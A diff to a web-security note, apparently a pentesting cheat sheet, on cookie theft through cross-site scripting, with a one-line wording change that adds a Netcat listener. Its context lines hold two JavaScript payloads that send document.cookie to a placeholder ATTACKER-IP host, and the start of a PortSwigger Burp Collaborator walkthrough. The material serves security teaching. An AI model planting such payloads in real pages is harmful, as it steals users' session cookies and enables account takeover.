@@ -10,7 +10,7 @@ An attacker can start their own server using Python's `http` module or start a N
 document.location='http://ATTACKER-IP/index.php?c='+document.cookie;
 new Image().src='http://ATTACKER-IP/index.php?c='+btoa(document.cookie);
 ```
-Once the payload is triggered by a user visiting the vulnerable page, a HTTP request will be sent to the attacker's server containing the stolen cookie.
+Once the payload is triggered by a user visiting the vulnerable page, a HTTP request will be sent to the attacker's server or Netcat listener containing the stolen cookie.
 ## Example from PortSwigger Academy
 1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
 2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
